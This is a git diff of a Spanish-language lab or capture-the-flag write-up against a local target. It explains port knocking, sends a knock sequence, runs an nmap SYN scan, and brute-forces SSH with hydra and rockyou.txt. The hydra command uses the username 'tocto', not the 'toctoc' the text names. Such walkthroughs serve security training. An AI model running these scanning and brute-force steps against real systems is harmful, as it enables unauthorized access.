@@ -69,10 +69,12 @@ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web
 ![image](https://github.com/user-attachments/assets/527503ea-c5e6-49fe-99f5-d639bb52c61d)
 
 Nos encontramos con este mensaje en el archivo txt que encontramos con **gobuster** llamado *qdefense.txt*.
-Por la información del fichero podría tratarse de una secuencia de puertos que tendríamos que utilizar para obtener información. Deberemos utilizar la técnica de **Port Knocking**.
+A parte que nos informa de un posible usuario **toctoc**, por la información del fichero podría tratarse de una secuencia de puertos que tendríamos que utilizar para obtener información. Deberemos utilizar la técnica de **Port Knocking**.
 
 *Port Knocking es una técnica de seguridad utilizada para controlar el acceso a servicios en un servidor, como una forma de autenticación antes de permitir la conexión a puertos específicos. La idea principal es que los puertos en un servidor están "cerrados" y no responden a conexiones normales hasta que se haya completado una secuencia particular de intentos de conexión en puertos específicos, conocida como "knock sequence" o secuencia de golpeo.*
+
 **¿Cómo funciona?**
+
 *Secuencia de Golpeo:* El usuario debe intentar conectarse a una serie de puertos en un orden específico. Por ejemplo, primero al puerto 7000, luego al 8000, y finalmente al 9000. Estos intentos pueden hacerse con paquetes de TCP, UDP o ICMP.
 
 *Registro de Golpes:* El servidor está monitoreando los intentos de conexión a estos puertos. No responde a los intentos, pero los registra.
@@ -80,5 +82,47 @@ Por la información del fichero podría tratarse de una secuencia de puertos que
 *Verificación de la Secuencia:* Si el servidor detecta que se ha seguido la secuencia correcta de golpes en los puertos, puede activar un script o una regla de firewall que abra el puerto que el usuario quiere acceder (por ejemplo, el puerto 22 para SSH).
 
 *Acceso Permitido:* Una vez que se permite el acceso, el usuario puede conectarse normalmente al puerto deseado.
+
+Primero de todo instalaremos **knock**.
+```
+sudo apt update && sudo apt install -y knockd
+```
+Una vez instalado ejecutamos el siguiente comando.
+
+```
+knock -v 172.17.0.2 7000 8000 9000
+```
+![image](https://github.com/user-attachments/assets/14fc05a6-7afb-4e81-9f4a-7d38e09b7136)
+
+Volvemos a hacer un escaneo de puertos y obtendremos acceso al puerto 22.
+```
+❯ sudo nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 172.17.0.2
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-30 11:27 CEST
+Initiating ARP Ping Scan at 11:27
+Scanning 172.17.0.2 [1 port]
+Completed ARP Ping Scan at 11:27, 0.05s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 11:27
+Scanning 172.17.0.2 [65535 ports]
+Discovered open port 22/tcp on 172.17.0.2
+Discovered open port 80/tcp on 172.17.0.2
+Completed SYN Stealth Scan at 11:28, 26.52s elapsed (65535 total ports)
+Nmap scan report for 172.17.0.2
+Host is up, received arp-response (0.000076s latency).
+Scanned at 2024-07-30 11:27:39 CEST for 26s
+Not shown: 65533 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 64
+80/tcp open  http    syn-ack ttl 64
+```
+Ahora utilizamos **hydra** con el usuario **toctoc** obtenido en el archivo txt, para con fuerza bruta descubrir la contraseña.
+
+```
+hydra -l tocto -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
+```
+
+
+
 
 
